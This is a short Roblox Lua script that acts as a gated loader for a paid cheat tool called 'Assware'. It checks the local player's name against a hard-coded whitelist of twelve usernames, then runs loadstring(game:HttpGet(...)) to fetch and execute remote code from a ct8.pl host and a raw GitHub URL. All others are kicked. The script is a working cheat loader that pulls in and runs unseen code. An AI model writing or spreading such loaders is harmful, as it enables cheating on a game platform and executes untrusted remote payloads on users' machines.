local players = {
	["lp0nda"] = true,
	["FunnyNitron"] = true,
	["killername123ds"] = true,
	["wsergwhe"] = true,
	["maxXD1920"] = true,
	["zulapro12"] = true,
	["Rozzcom"] = true,
	["LucasGaming060"] = true, 
	["obbytrainer2010"] = true,
	["BrandelCat"] = true,
	["tengtingpang"] = true,
	["danoninho12234"] = true
}
local username = game.Players.LocalPlayer.Name
local down = loadstring(game:HttpGet("http://testproj11234.ct8.pl/waredown.txt"))()

if players[username] == true then
	print("loading assware for " .. username)
	loadstring(game:HttpGet("https://raw.githubusercontent.com/helplynch/cheetsxd/main/v3.lua"))()
else
	game.Players.LocalPlayer:Kick("You dont have access to Assware, please open a ticket in the server if you bought the gamepass and need access")
end

if down == true then
	game.Players.LocalPlayer:Kick("Assware is currently offline, please wait before using it again.")
end
